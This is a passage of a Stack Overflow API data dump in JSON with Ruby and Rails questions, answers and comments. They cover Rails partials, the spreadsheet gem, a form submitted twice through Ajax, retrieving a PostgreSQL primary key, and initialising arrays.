noreferrer\">https://apidock.com/rails/ActionController/Helpers/ClassMethods/helper_method</a></p>\n\n<p>One more recommendation is to rename <code>permission_controller</code> to <code>permissions_controller</code> to follow Rails resources/controller naming convention.</p>\n"}], "owner": {"reputation": 63, "user_id": 9281878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qef8x.jpg?s=128&g=1", "display_name": "AksharaDL", "link": "https://stackoverflow.com/users/9281878/aksharadl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1535531258, "creation_date": 1535524602, "last_edit_date": 1535525483, "question_id": 52070967, "link": "https://stackoverflow.com/questions/52070967/ruby-on-rails-search-result-on-the-same-page-error", "title": "Ruby on Rails search &amp; Result on the same page error", "body": "<p>Here the <code>show.html</code> displays a dropdown, which contain Roles.\nWhen we select the role we should able to get permission result in the same page</p>\n\n<p>For that I used partial, but getting error as given in the image,</p>\n\n<p>Without using partial when i tried to display in a separate <code>display.html.erb</code> file , I am getting proper result.</p>\n\n<p>but i want to get result in same <code>show.html.erb</code> file.</p>\n\n<p>Kindly give my some suggestions to attain the proper results</p>\n\n<p><a href=\"https://i.stack.imgur.com/NwDal.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/NwDal.png\" alt=\"enter image description here\"></a></p>\n\n<h1>permission_controller</h1>\n\n<pre><code>def display\n  param = params[:role]\n  id=param[:id]\n  @roles = Role.includes(:permissions).all\n  @uniq_controller = Role.joins(:permissions).where('roles.id=?',id).select('permissions.*').group_by { |p| p.description }\n\n  redirect_to permissions_show_path\nend\n\ndef show\n  @permission = Permission.new\nend\n</code></pre>\n\n<h1>show.html.erb</h1>\n\n<pre><code>&lt;%= form_tag(:controller =&gt; \"permissions\", :action =&gt; \"display\") do %&gt;\n  &lt;%= collection_select(:role, :id, Role.all, :id, :name) %&gt;\n  &lt;button type=\"submit\"&gt;search&lt;/button&gt;\n&lt;% end %&gt;\n\n&lt;th width=\"25px\"&gt; &lt;%= \"Controller\" %&gt;&lt;/th&gt;\n&lt;th width=\"25px\"&gt; &lt;%= \"Permissions\" %&gt;&lt;/th&gt;\n\n&lt;% @uniq_controller.each do |permission| %&gt;\n  &lt;%= render partial:\"display\", locals:{permission:permission} %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<h1>_display.html.erb</h1>\n\n<pre><code>&lt;thead&gt;                      \n  &lt;th width=\"25px\"&gt; &lt;%= permission.first.gsub(\"_\",\" \") %&gt;&lt;/th&gt;                         \n  &lt;% permission.second.each do |cont| %&gt;                              \n    &lt;tr&gt;                           \n      &lt;th width=\"25px\"&gt;&lt;%= check_box_tag :permission_ids, {multiple: true}, \n cont.id %&gt;&lt;%= cont.name %&gt;&lt;/th&gt;\n    &lt;/tr&gt;\n  &lt;% end %&gt;\n&lt;/thead&gt;\n</code></pre>\n"}, {"tags": ["ruby", "excel", "spreadsheet"], "comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535521381, "post_id": 52069860, "comment_id": 91090152, "body": "Can you see what <code>book.worksheets.map(&amp;:name)</code> prints?"}, {"owner": {"reputation": 223, "user_id": 5310502, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/b6f92af37160cf2310ac2ccadcd9b758?s=128&d=identicon&r=PG&f=1", "display_name": "testerBDD", "link": "https://stackoverflow.com/users/5310502/testerbdd"}, "reply_to_user": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535546183, "post_id": 52069860, "comment_id": 91104939, "body": "it print the sheet names and i can see the sheetname in the output, so the sheet exist only problem is that it not able to read multiple sheets at a time"}, {"owner": {"reputation": 9602, "user_id": 3607136, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/NRFso.jpg?s=128&g=1", "display_name": "Gagan Gami", "link": "https://stackoverflow.com/users/3607136/gagan-gami"}, "edited": false, "score": 0, "creation_date": 1535548484, "post_id": 52069860, "comment_id": 91106629, "body": "@testerBDD : check my updated answer"}], "answers": [{"comments": [{"owner": {"reputation": 223, "user_id": 5310502, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/b6f92af37160cf2310ac2ccadcd9b758?s=128&d=identicon&r=PG&f=1", "display_name": "testerBDD", "link": "https://stackoverflow.com/users/5310502/testerbdd"}, "edited": false, "score": 0, "creation_date": 1535546043, "post_id": 52071512, "comment_id": 91104830, "body": "both the sheets exist if i use only one sheet (either sheet1 or sheet2) it works but if i want to use both the sheets at a same time it is failing"}, {"owner": {"reputation": 9602, "user_id": 3607136, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/NRFso.jpg?s=128&g=1", "display_name": "Gagan Gami", "link": "https://stackoverflow.com/users/3607136/gagan-gami"}, "reply_to_user": {"reputation": 223, "user_id": 5310502, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/b6f92af37160cf2310ac2ccadcd9b758?s=128&d=identicon&r=PG&f=1", "display_name": "testerBDD", "link": "https://stackoverflow.com/users/5310502/testerbdd"}, "edited": false, "score": 0, "creation_date": 1535547704, "post_id": 52071512, "comment_id": 91106058, "body": "@testerBDD : i have test in my local, working fine.. got output <code>sheet1.rows.count =&gt; 362</code> and <code>sheet2.rows.count  =&gt; 37 </code>"}], "tags": [], "owner": {"reputation": 9602, "user_id": 3607136, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/NRFso.jpg?s=128&g=1", "display_name": "Gagan Gami", "link": "https://stackoverflow.com/users/3607136/gagan-gami"}, "is_accepted": false, "score": 0, "last_activity_date": 1535548396, "last_edit_date": 1535548396, "creation_date": 1535526595, "answer_id": 52071512, "question_id": 52069860, "link": "https://stackoverflow.com/questions/52069860/spreadsheet-gem-error-accessing-multiple-sheets-of-a-excel-file/52071512#52071512", "title": "spreadsheet gem error accessing multiple sheets of a excel file", "body": "<p><strong>UPDATE:</strong></p>\n\n<p>silly mistake, you have not taken <code>sheetname2</code> variable, check your code:</p>\n\n<pre><code>sheetname1 =\"sheet1\"\nsheetname1 =\"sheet2\" # should be sheetname2\n</code></pre>\n\n<hr>\n\n<blockquote>\n  <p>NoMethodError: undefined method `rows' for nil:NilClass</p>\n</blockquote>\n\n<p>read error properly, your <code>sheet2</code> seems <code>nil</code> </p>\n\n<p>You can access worksheet of workbook with <code>index</code> or <code>name</code></p>\n\n<p>for eg:</p>\n\n<pre><code>  sheet1 = book.worksheets sheetname1\n  sheet2 = book.worksheets sheetname2\n\n  # to avoid above error, you can add if condition to check\n  if sheet2\n    5.upto(sheet2.rows.count) do |findrownum|\n      0.upto(sheet2.column_count) do |findcolnum|\n      end\n    end\n  end\n</code></pre>\n\n<p>for more info:\n<a href=\"https://github.com/zdavatz/spreadsheet/blob/master/GUIDE.md#reading-is-easy\" rel=\"nofollow noreferrer\">https://github.com/zdavatz/spreadsheet/blob/master/GUIDE.md#reading-is-easy</a></p>\n"}], "owner": {"reputation": 223, "user_id": 5310502, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/b6f92af37160cf2310ac2ccadcd9b758?s=128&d=identicon&r=PG&f=1", "display_name": "testerBDD", "link": "https://stackoverflow.com/users/5310502/testerbdd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 116, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1535548396, "creation_date": 1535519533, "last_edit_date": 1535528458, "question_id": 52069860, "link": "https://stackoverflow.com/questions/52069860/spreadsheet-gem-error-accessing-multiple-sheets-of-a-excel-file", "title": "spreadsheet gem error accessing multiple sheets of a excel file", "body": "<p>I am trying to access multiple sheets of a excel file at a time and facing issue, below is the code</p>\n\n<pre><code>sheetname1 =\"sheet1\"\nsheetname1 =\"sheet2\"\nbook = Spreadsheet.open(file_name)\n\nsheet1 = book.worksheets.find { |sheet| sheet.name == sheetname1 } \nsheet2 = book.worksheets.find { |sheet| sheet.name == sheetname2 } \n5.upto(sheet2.rows.count) do |findrownum|\n  0.upto(sheet2.column_count) do |findcolnum|\n  end\nend\n</code></pre>\n\n<p>error which i am getting is , not sure why it is not able to read sheet2 </p>\n\n<pre><code>NoMethodError: undefined method `rows' for nil:NilClass\n</code></pre>\n"}, {"tags": ["jquery", "ruby-on-rails", "ruby", "ajax"], "comments": [{"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535518550, "post_id": 52069668, "comment_id": 91089201, "body": "Can you update your OP with the form ?"}, {"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535518654, "post_id": 52069668, "comment_id": 91089236, "body": "make sure you don&#39;t have this <code>= javascript_include_tag &#39;application&#39;</code> duplicated in any other files/partials."}, {"owner": {"reputation": 119, "user_id": 7738138, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/1728017913892004/picture?type=large", "display_name": "JiaPing", "link": "https://stackoverflow.com/users/7738138/jiaping"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535519494, "post_id": 52069668, "comment_id": 91089477, "body": "I&#39;ve updated my code. I checked and I only include one javascript_include_tag"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535521507, "post_id": 52069668, "comment_id": 91090212, "body": "Do you have any JavaScript events bound to the form submit?"}, {"owner": {"reputation": 119, "user_id": 7738138, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/1728017913892004/picture?type=large", "display_name": "JiaPing", "link": "https://stackoverflow.com/users/7738138/jiaping"}, "edited": false, "score": 0, "creation_date": 1535522625, "post_id": 52069668, "comment_id": 91090627, "body": "Yes, I did $(&#39;body&#39;).on &#39;click&#39;, &#39;.js-sign-up-btn to trigger ajax post"}], "answers": [{"comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 1, "creation_date": 1535525851, "post_id": 52070530, "comment_id": 91092184, "body": "This is a better way of doing it."}], "tags": [], "owner": {"reputation": 1556, "user_id": 2830852, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/31ea598b6bc18b59de1e77a4c6f6c3e5?s=128&d=identicon&r=PG", "display_name": "Tarek N. Elsamni", "link": "https://stackoverflow.com/users/2830852/tarek-n-elsamni"}, "is_accepted": false, "score": 1, "last_activity_date": 1535522972, "creation_date": 1535522972, "answer_id": 52070530, "question_id": 52069668, "link": "https://stackoverflow.com/questions/52069668/ruby-on-rails-form-submitted-twice-due-to-ajax/52070530#52070530", "title": "Ruby on Rails - Form submitted twice due to Ajax", "body": "<p><code>remote: true</code> will automagically handle the Ajax request which means your form will be submitted using Ajax and the page won't reload. You should not trigger any other custom Ajax post request in your Javascript code.</p>\n\n<p>If you want a callback to update when the ajax request returns a response you can do that by rendering a js view on the requested resource as shown in this example:</p>\n\n<p><a href=\"https://blog.codeship.com/unobtrusive-javascript-via-ajax-rails/\" rel=\"nofollow noreferrer\">https://blog.codeship.com/unobtrusive-javascript-via-ajax-rails/</a></p>\n"}, {"tags": [], "owner": {"reputation": 95, "user_id": 2042176, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d04c1ce0c0a57404e8c8c5de33995b79?s=128&d=identicon&r=PG", "display_name": "nishanth", "link": "https://stackoverflow.com/users/2042176/nishanth"}, "is_accepted": true, "score": 1, "last_activity_date": 1535524360, "last_edit_date": 1535524360, "creation_date": 1535523182, "answer_id": 52070577, "question_id": 52069668, "link": "https://stackoverflow.com/questions/52069668/ruby-on-rails-form-submitted-twice-due-to-ajax/52070577#52070577", "title": "Ruby on Rails - Form submitted twice due to Ajax", "body": "<p>You are sending two request for submitting the form, one is when you write remote => true in the form it will make ajax request and again you are binding an ajax request for submitting the form, remove the remote => true from the form_for.</p>\n"}], "owner": {"reputation": 119, "user_id": 7738138, "user_type": "registered", "accept_rate": 55, "profile_image": "https://graph.facebook.com/1728017913892004/picture?type=large", "display_name": "JiaPing", "link": "https://stackoverflow.com/users/7738138/jiaping"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 472, "favorite_count": 0, "accepted_answer_id": 52070577, "answer_count": 2, "score": 4, "last_activity_date": 1535524360, "creation_date": 1535518105, "last_edit_date": 1535519441, "question_id": 52069668, "link": "https://stackoverflow.com/questions/52069668/ruby-on-rails-form-submitted-twice-due-to-ajax", "title": "Ruby on Rails - Form submitted twice due to Ajax", "body": "<p>My form submitted twice as below, it was cause by <code>:remote=&gt;true</code>.\nI need to use ajax to get <code>plan_id</code> this value is from javascript.</p>\n\n<pre><code>Started POST \"/users/sign_up\" for 127.0.0.1 at 2018-08- \n29 13:31:04 +0900\nProcessing by Users::SignUpController#create as JSON\n  Parameters: {\"utf8\"=&gt;\"\u2713\", \"user\"=&gt; \n{\"deliveries_attributes\"=&gt;{\"0\"=&gt;{\"num\"=&gt;\"1\", \n\"box_delivery_scheduled_on\"=&gt;\"\", \n\"box_delivery_scheduled_range\"=&gt;\"\"}}, \n\"collects_attributes\"=&gt;{\"0\"=&gt; \n{\"box_collect_scheduled_on\"=&gt;\"\", \n\"box_collect_scheduled_range\"=&gt;\"\"}}, \"last_name\"=&gt;\"\", \n\"first_name\"=&gt;\"\", \"last_name_kana\"=&gt;\"\", \n\"first_name_kana\"=&gt;\"\", \"birth(1i)\"=&gt;\"\", \n\"birth(2i)\"=&gt;\"\", \"birth(3i)\"=&gt;\"\", \"zipcode\"=&gt;\"\", \n\"prefecture\"=&gt;\"\", \"address1\"=&gt;\"\", \"address2\"=&gt;\"\", \n\"building\"=&gt;\"\", \"tel\"=&gt;\"\", \"email\"=&gt;\"\", \n\"email_confirmation\"=&gt;\"\", \"credit_cards_attributes\"=&gt; \n{\"0\"=&gt;{\"number\"=&gt;\"\", \"name\"=&gt;\"\", \"exp_month\"=&gt;\"\", \n\"exp_year\"=&gt;\"\", \"last4\"=&gt;\"\"}}, \"password\"=&gt;\" \n[FILTERED]\", \"password_confirmation\"=&gt;\"[FILTERED]\", \n\"login_email\"=&gt;\"123@gmail.com\", \"login_password\"=&gt;\" \n[FILTERED]\"}, \"plan_id\"=&gt;\"1\"}\nPlan Load (0.9ms)  SELECT  `plans`.* FROM `plans` WHERE \n`plans`.`deleted_at` IS NULL AND `plans`.`id` = 1 LIMIT \n 1\n   User Load (0.7ms)  SELECT  `users`.* FROM `users` \n WHERE `users`.`deleted_at` IS NULL AND `users`.`email` \n = '123@gmail.com' ORDER BY `users`.`id` ASC LIMIT 1\n   Completed 200 OK in 196ms (Views: 0.2ms | \n ActiveRecord: 1.6ms)\n\n\nStarted POST \"/users/sign_up\" for 127.0.0.1 at 2018-08-29 13:31:04 +0900\nProcessing by Users::SignUpController#create as JS\n  Parameters: {\"utf8\"=&gt;\"\u2713\", \"user\"=&gt; \n{\"deliveries_attributes\"=&gt;{\"0\"=&gt;{\"num\"=&gt;\"1\", \n\"box_delivery_scheduled_on\"=&gt;\"\", \n\"box_delivery_scheduled_range\"=&gt;\"\"}}, \n\"collects_attributes\"=&gt;{\"0\"=&gt; \n{\"box_collect_scheduled_on\"=&gt;\"\", \n\"box_collect_scheduled_range\"=&gt;\"\"}}, \"last_name\"=&gt;\"\", \n\"first_name\"=&gt;\"\", \"last_name_kana\"=&gt;\"\", \n\"first_name_kana\"=&gt;\"\", \"birth(1i)\"=&gt;\"\", \n\"birth(2i)\"=&gt;\"\", \n\"birth(3i)\"=&gt;\"\", \"zipcode\"=&gt;\"\", \"prefecture\"=&gt;\"\", \n\"address1\"=&gt;\"\", \"address2\"=&gt;\"\", \"building\"=&gt;\"\", \n\"tel\"=&gt;\"\", \n\"email\"=&gt;\"\", \"email_confirmation\"=&gt;\"\", \n\"credit_cards_attributes\"=&gt;{\"0\"=&gt;{\"number\"=&gt;\"\", \n\"name\"=&gt;\"\", \n\"exp_month\"=&gt;\"\", \"exp_year\"=&gt;\"\", \"last4\"=&gt;\"\"}}, \n\"password\"=&gt;\"[FILTERED]\", \"password_confirmation\"=&gt;\" \n[FILTERED]\", \"login_email\"=&gt;\"123@gmail.com\", \n\"login_password\"=&gt;\"[FILTERED]\"}, \"commit\"=&gt;\"\u30ed\u30b0\u30a4\u30f3\u3057\u3066 \n\u78ba\u8a8d\u3078\u9032\u3080\"}\n</code></pre>\n\n<p>It trigger twice, even I've added <code>remote: true</code> in the form.</p>\n\n<p>I also checked my <code>app/assets/javascripts/application.js.coffee</code></p>\n\n<pre><code># = require jquery3                                                                                                                         \n# = require jquery_ujs\n# = require bootstrap-sprockets\n</code></pre>\n\n<p>And checked <code>/layouts/application.html.slim</code></p>\n\n<pre><code>doctype html                                                                                                                                \nhtml\n  head\n    = render 'layouts/meta_tags'\n    = stylesheet_link_tag 'application', media: 'all'\n    = javascript_include_tag 'application'\n    = csrf_meta_tags\n  body\n    = render 'layouts/navbar'\n    = render 'shared/flash'\n    main.container\n      = yield\n</code></pre>\n\n<p>This is my form code</p>\n\n<pre><code>= form_for @user, url: users_sign_up_url, remote: true, html: { id: \n'users_sign_up_form' } do |f|                                           \n  = render 'plan'              \n  = f.fields_for :deliveries do |fd|\n  .field                     \n    = fd.label :num          \n    = fd.select :num, (1..100).map { |n| [\"#{n}\", n] },{}, { id: 'js- \n    select-num' }\n  .field\n    = fd.label :box_delivery_scheduled\n    = fd.select :box_delivery_scheduled_on, DateJaRange.new(Time.zone.now \n    + 1.day..Time.zone.now + 8.days)                   \n    = fd.select: box_delivery_scheduled_range,Delivery.\n    box_delivery_scheduled_ranges_i18n.invert\n  = f.fields_for :collects do |fc|\n  .field\n    = fc.label :box_collect_scheduled\n    = fc.select :box_collect_scheduled_on, DateJaRange.new(Time.zone.now + \n    3.days..Time.zone.now + 10.days)\n    = fc.select :box_collect_scheduled_range,\n    Collect.box_collect_scheduled_ranges_i18n.invert\n  .row\n    = f.label :email                                                                                                                          \n    = f.text_field :login_email, as: :email\n    p.error= show_errors(f.object, :login_email)\n  .row\n    = f.label :password          \n    = f.password_field :login_password\n    p.error= show_errors(f.object, :login_password)\n  .row\n    = f.submit '\u30ed\u30b0\u30a4\u30f3\u3057\u3066\u78ba\u8a8d\u3078\u9032\u3080', class: 'js-sign-up-btn'\n</code></pre>\n\n<p>What is the possible problem to cause these double requests?<br>\nI've searched a lot by stackoverflow and tried, but still can't solve the problem.</p>\n"}, {"tags": ["ruby", "postgresql"], "answers": [{"tags": [], "owner": {"reputation": 46, "user_id": 2046200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/214d856e3b7f8289e94a5cfa56493e03?s=128&d=identicon&r=PG", "display_name": "Thumbnail", "link": "https://stackoverflow.com/users/2046200/thumbnail"}, "is_accepted": true, "score": 3, "last_activity_date": 1535519121, "creation_date": 1535519121, "answer_id": 52069812, "question_id": 52069482, "link": "https://stackoverflow.com/questions/52069482/how-to-get-auto-generated-row-primary-key-via-ruby-postgresql-gem/52069812#52069812", "title": "How to get auto-generated row primary key via Ruby PostgreSQL gem?", "body": "<p>According to the <a href=\"https://www.postgresql.org/docs/8.1/static/datatype-oid.html\" rel=\"nofollow noreferrer\">docs</a>, if the object id you're retrieving isn't set, thus nil. </p>\n\n<p>You either have to set the object id yourself, or use <code>returning</code> like this:</p>\n\n<pre><code>res  = conn.exec(\"INSERT INTO users (name) VALUES ('john') returning id\")\nres[0]['id']\n#=&gt; 1\n</code></pre>\n"}], "owner": {"reputation": 93455, "user_id": 187141, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/f9e28dc83496320c87c55b3cf988ab60?s=128&d=identicon&r=PG", "display_name": "yegor256", "link": "https://stackoverflow.com/users/187141/yegor256"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "accepted_answer_id": 52069812, "answer_count": 1, "score": 1, "last_activity_date": 1535519121, "creation_date": 1535516829, "question_id": 52069482, "link": "https://stackoverflow.com/questions/52069482/how-to-get-auto-generated-row-primary-key-via-ruby-postgresql-gem", "title": "How to get auto-generated row primary key via Ruby PostgreSQL gem?", "body": "<p>My table in PostgreSQL looks like this:</p>\n\n<pre><code>CREATE TABLE user (\n  id SERIAL PRIMARY KEY,\n  name VARCHAR(255) NOT NULL\n)\n</code></pre>\n\n<p>I'm using Ruby <a href=\"https://github.com/ged/ruby-pg\" rel=\"nofollow noreferrer\">pg</a> gem to add a record to the table:</p>\n\n<pre><code>c = PG.connect(dbname: 'foo')\nid = c.exec_params('INSERT INTO user (name) VALUES ($1)', ['Jeff']).oid_value\n</code></pre>\n\n<p>I'm getting <code>nil</code> back, instead of the auto-generated <code>id</code> of the new record. What is the right way to get it back?</p>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 2953, "user_id": 5133088, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d0efad94ced5dcd194c0a482cafd4f7b?s=128&d=identicon&r=PG&f=1", "display_name": "Jeroen Heier", "link": "https://stackoverflow.com/users/5133088/jeroen-heier"}, "edited": false, "score": 3, "creation_date": 1535515151, "post_id": 52069227, "comment_id": 91088342, "body": "What do you want to achieve by writing all your code in one line?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 5, "creation_date": 1535515828, "post_id": 52069227, "comment_id": 91088487, "body": "<code>a, b = Array.new(2) { [0, 0] }</code>."}, {"owner": {"reputation": 2151, "user_id": 10068463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c3df811097b7fb8fef67238aad1151ca?s=128&d=identicon&r=PG&f=1", "display_name": "Nate", "link": "https://stackoverflow.com/users/10068463/nate"}, "edited": false, "score": 0, "creation_date": 1535519515, "post_id": 52069227, "comment_id": 91089482, "body": "As a side note, if you are doing this in any sort of large loop, you should manually create two arrays yourself. Otherwise, you end up creating three arrays when you only need two, and the garbage collection on that is expensive, when used in large loops."}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535520007, "post_id": 52069227, "comment_id": 91089648, "body": "What is the problem with <code>b</code> or reference address? State your problem clearly."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1535526108, "post_id": 52069227, "comment_id": 91092335, "body": "I would write two lines: <code>a = [0, 0]</code> and <code>b = [0, 0]</code> \u2013 much easier to read and no overhead."}, {"owner": {"reputation": 47232, "user_id": 1772830, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/Qtoqg.jpg?s=128&g=1", "display_name": "Andrey Deineko", "link": "https://stackoverflow.com/users/1772830/andrey-deineko"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1535526707, "post_id": 52069227, "comment_id": 91092684, "body": "@Stefan it doesn&#39;t come soon to new developers that readability is much more (the most?) valuable than few saved lines of code. Been there, done that :)"}, {"owner": {"reputation": 13, "user_id": 8118674, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-t-ln1UxyN8U/AAAAAAAAAAI/AAAAAAAAAN0/lgrqqWjzj-M/photo.jpg?sz=128", "display_name": "Giuse Trieu", "link": "https://stackoverflow.com/users/8118674/giuse-trieu"}, "reply_to_user": {"reputation": 2953, "user_id": 5133088, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/d0efad94ced5dcd194c0a482cafd4f7b?s=128&d=identicon&r=PG&f=1", "display_name": "Jeroen Heier", "link": "https://stackoverflow.com/users/5133088/jeroen-heier"}, "edited": false, "score": 0, "creation_date": 1535598756, "post_id": 52069227, "comment_id": 91127615, "body": "@JeroenHeier Because I want to count many conditions, i have to initialize then use +=1"}], "answers": [{"comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1535576681, "post_id": 52070342, "comment_id": 91122426, "body": "I didn&#39;t downvote, but it is in general not seen as productive to answer duplicate questions since it fragments the knowledge across the site. Rather, simply vote to close as a duplicate, and move on. This exact same question has been asked and answered literally dozens of times already on <a href=\"https://stackoverflow.com\">Stack Overflow</a>, it doesn&#39;t really require yet another answer saying the exact same thing as a hundred other ones."}, {"owner": {"reputation": 13, "user_id": 8118674, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-t-ln1UxyN8U/AAAAAAAAAAI/AAAAAAAAAN0/lgrqqWjzj-M/photo.jpg?sz=128", "display_name": "Giuse Trieu", "link": "https://stackoverflow.com/users/8118674/giuse-trieu"}, "edited": false, "score": 0, "creation_date": 1535598927, "post_id": 52070342, "comment_id": 91127647, "body": "@JagdeepSingh Thanks for your explain, I  really don&#39;t read carefully. My bad!"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1535964750, "post_id": 52070342, "comment_id": 91242192, "body": "@J&#246;rgWMittag I agree completely that it is not productive to provide answers to questions with already answered duplicates. I myself try to find a duplicate first. Failing to do so, I put my answer there. Same thing happened here. Anyways, duplicate or not, an answer is not downvotable if it is solving the problem correctly. Right?"}, {"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 1, "creation_date": 1535968142, "post_id": 52070342, "comment_id": 91244161, "body": "If you hover over the downvote arrow, the tooltip gives one example of why you might want to downvote an answer: &quot;This answer is not useful&quot;. Different people interpret &quot;useful&quot; differently. Some interpret it as &quot;useful for the asker&quot;, some interpret it as &quot;useful for themselves&quot;, some interpret it as &quot;making the world a better place&quot;, some interpret it as &quot;making <a href=\"https://stackoverflow.com\">Stack Overflow</a> a better place&quot;. I can see why someone who subscribes to the latter interpretation may find that answering duplicate questions does not make <a href=\"https://stackoverflow.com\">Stack Overflow</a> a better place. But you have to ask the downvoter if you want a definite answer."}], "tags": [], "owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "is_accepted": true, "score": 1, "last_activity_date": 1535522023, "creation_date": 1535522023, "answer_id": 52070342, "question_id": 52069227, "link": 